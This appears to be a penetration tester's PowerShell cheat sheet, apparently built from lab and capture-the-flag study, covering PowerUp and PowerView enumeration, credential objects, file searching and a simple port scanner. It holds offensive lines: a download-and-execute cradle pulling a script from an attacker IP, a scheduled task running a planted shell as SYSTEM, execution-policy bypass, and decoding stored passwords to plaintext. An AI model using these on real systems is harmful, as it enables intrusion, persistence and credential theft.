# PS

| [https://www.puckiestyle.nl/powershell/](https://www.puckiestyle.nl/powershell/)                                                       |
| -------------------------------------------------------------------------------------------------------------------------------------- |
| [https://www.infosecmatter.com/powershell-commands-for-pentesters/](https://www.infosecmatter.com/powershell-commands-for-pentesters/) |
| [https://www.puckiestyle.nl/week-of-ps-shells/](https://www.puckiestyle.nl/week-of-ps-shells/)                                         |

## Powershell on Kali

Installing powershell and using pswh

## PowerUp

[https://www.harmj0y.net/blog/powershell/powerup-a-usage-guide/](https://www.harmj0y.net/blog/powershell/powerup-a-usage-guide/)

A powershell script called PowerUp, that's purpose is to evaluate a Windows machine and determine any abnormalities - "PowerUp aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations."

```powershell
git clone https://github.com/PowerShellMafia/PowerSploit.git
# Edit PowerUp.ps1 and add Invoke-AllChecks at the end of the code.
PS C:\> IEX(New-Object Net.WebClient).downloadString('http://10.10.14.20/PowerUp.ps1')
# ****METASPLOIT
msf > upload PowerUp.ps1
msf > load powershell
PS > .\PowerUp.ps1
```

## PowerView

{% code overflow="wrap" %}
```powershell
# TIPS AND TRICKS
https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993

https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
PS > .\PowerView.ps1 # import the PowerView module
Get-NetComputer -fulldata | select operatingsystem # gets a list of all operating systems on the domain
Get-NetUser | select cn # gets a list of all users on the domain
# Enumerate the domain groups
Get-NetGroup -GroupName *admin*
# Enumerate shares
Get-SmbShare
```
{% endcode %}

## Bypass PowerShell execution policy by encoding ps script into bat file.

[https://github.com/klsecservices/bat-armor/](https://github.com/klsecservices/bat-armor/)

## General

{% code overflow="wrap" fullWidth="true" %}
```powershell
. .\powercat.ps1 # Loading a local PowerShell script using dot sourcing
# Unrestricted execution
Set-ExecutionPolicy Unrestricted -Force

# more/less equivalent
some-cmdlet | out-host -paging
# Find/Search files
https://shellgeek.com/powershell-search-for-files/
gc # it is shorter version for Get-Content, like gci is Get-ChildItem
gci -recurse -include *.* | select FullName
PS C:\Temp> Get-ChildItem *.txt # in current directory
PS C:\> Get-ChildItem -Path D:\ -Recurse # recursively
PS C:\> Get-ChildItem -Path D:\ -Recurse -ErrorAction SilentlyContinue # continue even in case of error
PS D:\Temp> Get-ChildItem -Filter *.txt -Recurse # find all items in subdir match specific filter
# Search string withing files - for all files containing API_KEY
Get-ChildItem C:\* -Recurse | Select-String -pattern API_KEY
# Show hidden files
gci -force .
ls -force
dir -force
gci -hidden
# Password data stream
PS > Get-Item -path flag.txt -Stream *
PS > Get-Content -path flag.txt -Stream Flag

# List the contents of the current directory
Get-ChildItem # options: 
-Path # Specifies a path to one or more locations. Wildcards are accepted.
-File / -Directory # get list of files / directories
-Filter # Specifies a filter to qualify the Path parameter.
-Recurse # Gets the items in the current locationand all child items recursively
-Hidden # To get only hidden items
-ErrorAction SilentlyContinue # Specifies what action to take if error.
# View all of the hidden files in the current directory
Get-ChildItem -File -Hidden -ErrorAction SilentlyContinue
# Read contents of a file
Get-Content -Path file.txt
# Get the number of words contained within a file
Get-Content -Path file.txt | Measure-Object -Word
# Get the exact position of a string within the file
(Get-Content -Path file.txt)[index] # index is numerical and starts at 0
# Change directories
Set-Location -Path c:\users\administrator\desktop
# Search a particular file for a pattern
Select-String -Path 'c:\users\administrator\desktop' -Pattern '*.pdf'

# Owner of a file
PS C:\> Get-Acl | Select-Object Owner
# Hash of a file
Get-FileHash C:\Users\Contoso8_1_ENT.iso -Algorithm SHA384 | Format-List
# Current working directory
Get-Location
# Decode Base64
PS > [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("blahblah"))

# Scheduled Tasks
Get-ScheduleTask -TaskName new-sched-task
# Execute .exe files with parameters
& "C:\Windows\Temp\FILE.exe" -PARAMETER
# Powershell over SSH
ssh l $user $IP

# Displays info about a cmdlet
Get-Help Command-Name
Get-Help Get-Command -Examples
# Get-Command gets all the cmdlets on the current Computer and allows patterns (*)
# Get-Command Verb-*
# Get-Command *-Noun
Get-Command New-* # to view all the cmdlets for the verb new
# Object manipulation with pipeline to pass an object (output) to the next cmdlet 
# Verb-Noun | Get-Member 
Get-Command | Get-Member -MemberType Method
# Pulling out the properties from the output of a cmdlet and creating a new object
Get-ChildItem | Select-Object -Property Mode, Name # other flags -First -Last -Unique -Skipo
# Filtering objects with to match a specific value
Verb-Noun | Where-Object -Property PropertyName -operator Value
https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/where-object?view=powershell-6
Get-Service | Where-Object -Property Status -EQ Stopped # check stopped processes
# Sorting objects
Get-ChildItem | Sort-Object # sort the list of directories

Get-LocalUser # get users
Get-LocalUser | Format-List # more info per user
Get-LocalGroup
(Get-Command Get-LocalUser).Parameters # get parameters
Get-LocalUser -SID "S-1-5-21-1394777289-3961777894-1791813945-501"
Get-LocalUser | Get-Member
Get-LocalUser | Where-Object -Property PasswordRequired -match False
Get-NetIPAddress # netstat for ports
# Only listening ports
Get-NetTCPConnection | Where-Object -Property State -Match Listen | measure
Get-HotFix
```
{% endcode %}

## PSCredential

{% code overflow="wrap" fullWidth="true" %}
```powershell
PS > $pw = ConvertTo-SecureString "password" -AsPlainText -Force
PS > $creds = New-Object System.Management.Automation.PSCredential ("Administrator", $pw)

# Requires PSRemoting
$username = 'Administrator';$password = '1234test';$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;Invoke-Command -Credential $credential -ComputerName COMPUTER_NAME -Command { whoami }
# without PSRemoting
powershell Start-Process cmd.exe -Credential (New-Object System.Management.Automation.PSCredential 'username', (ConvertTo-SecureString 'password' -AsPlainText -Force))
# without PS Remoting, with arguments
powershell -command "start-process cmd.exe -argumentlist '/c calc' -Credential (New-Object System.Management.Automation.PSCredential 'username',(ConvertTo-SecureString 'password' -AsPlainText -Force))"

############# PSCREDENTIAL DECRYPT
https://arttoolkit.github.io/wadcoms/PSCredential-decrypt/
# Read from XML 
https://stackoverflow.com/questions/40029235/save-pscredential-in-the-file
```
{% endcode %}

## Invoke-Command / Scheduled Task as another user

{% code overflow="wrap" fullWidth="true" %}
```powershell
$pw = ConvertTo-SecureString "Mypassword1234!" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("Administrator", $pw)
Invoke-Command -Computer $HOSTNAME -ScriptBlock { schtasks /create /sc onstart /tn shell /tr C:\inetpub\wwwroot\shell.exe /ru SYSTEM } -Credential $creds
SUCCESS: The scheduled task "shell" has successfully been created.
Invoke-Command -Computer $HOSTNAME -ScriptBlock { schtasks /run /tn shell } -Credential $creds
SUCCESS: Attempted to run the scheduled task "shell".
```
{% endcode %}

## Run as another user (requires GUI)

```powershell
Start-Process powershell 'Start-Process cmd -Verb RunAs' -Credential adm1n
```

## Enrollment Automation Account

{% code overflow="wrap" fullWidth="true" %}
```powershell
https://stackoverflow.com/questions/28352141/convert-a-secure-string-to-plain-text

$pw = Get-Content .creds.txt | ConvertTo-SecureString
$bstr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($pw)
$UnsecurePassword = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($bstr)
$UnsecurePassword
```
{% endcode %}

## Environment variables

```powershell
ls Env:\
```

## Find writable files

{% code overflow="wrap" fullWidth="true" %}
```powershell
$a = Get-ChildItem "c:\windows\" -recurse -ErrorAction SilentlyContinue
$a | % {
    $fileName = $_.fullname
    $acls = get-acl $fileName  -ErrorAction SilentlyContinue | select -exp access | ? {$_.filesystemrights -match "full|modify|write" -and $_.identityreference -match "authenticated users|everyone|$env:username"}
    if($acls -ne $null)
    {
        [pscustomobject]@{
            filename = $fileName
            user = $acls | select -exp identityreference
        }
    }
}
```
{% endcode %}

## Info gathering from text files

{% code overflow="wrap" fullWidth="true" %}
```powershell
#$folder =  Get-ChildItem -Path C:\Users\Administrator\Desktop\emails\ -Recurse -File | Select-Object FullName
#foreach($file in $folder){
    echo ""
    echo "INFO RELATED TO PASSWORDS"
    #Get-Content -Path $file.FullNamE
    Get-ChildItem C:\Users\Administrator\Desktop\emails\* -Recurse | Select-String -pattern "password is"
    echo "-------------------------"
    echo ""
    echo "INFO RELATED TO HTTPS LINKS"
    Get-ChildItem C:\Users\Administrator\Desktop\emails\* -Recurse | Select-String -pattern https://
#    break
#}
```
{% endcode %}

## Zip files / Unzip files

<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell"><strong># PowerShell v5.0 adds Compress-Archive and Expand-Archive cmdlets
</strong>Compress-Archive -Path C:\Stuff -DestinationPath archive.zip


# UNZIP
PS > Expand-Archive .\file.zip -DestinationPath .
# If you need to unzip files when transferring from Kali to Windows via cmd and Powershell is available you can use this.

Add-Type -AssemblyName System.IO.Compression.FileSystem
function Unzip
{
    param([string]$zipfile, [string]$outpath)

    [System.IO.Compression.ZipFile]::ExtractToDirectory($zipfile, $outpath)
}

# You can then call the function like this
PS > Unzip "C:\Lab19\zipped-file.zip" "C:\Lab19\zipped-file"
</code></pre>

## Extract info from shortcut link (.lnk)

```powershell
$WScript = New-Object -ComObject Wscript.Shell
$shortcut = Get-ChildItem *.lnk
$shortcut
$Wscript.CreateShortcut($shortcut)

# ALTERNATIVE: encode the file and transfer it to Linux
certutil -encode "file.lnk" output
# Copy/paste output to Linux file called lnk.b64 and then
base64 -d lnk.b64 > lnk
https://github.com/HarmJ0y/pylnker
pylnker.py lnk
```

## Port scanner

{% code overflow="wrap" fullWidth="true" %}
```powershell
$text_IP = Get-Content -Path C:\Users\Administrator\Desktop\IPs.txt

$text_ports_range = Get-Content -Path C:\Users\Administrator\Desktop\ports-range.txt

$ports = $text_ports_range.Split("-")   #Split ports 100-120 to establish upper and lower range

$port_start = [int]$ports[0]

$port_end = [int]$ports[1]

foreach($IP in $text_IP){
    
    $Error.Clear()
    try{
        
        Test-Connection -ComputerName $IP -Count 1 *>$null # *>$null to not show
    }
    catch{ 
        echo "The host $IP is down.`n"   # `n to create newline

        break
    }
    if(!$Error) {
        echo "The host $IP is up.`n"
    }
    
    for($i = $port_start; $i -le $port_end; $i++){

        Test-NetConnection -ComputerName $IP -Port $i #| Select-String -Pattern "failed"
    
    }
    echo "`n`n"

}
```
{% endcode %}

## References

{% embed url="https://medium.com/@ratiros01/tryhackme-hacking-with-powershell-bf6dbc5febc9" %}
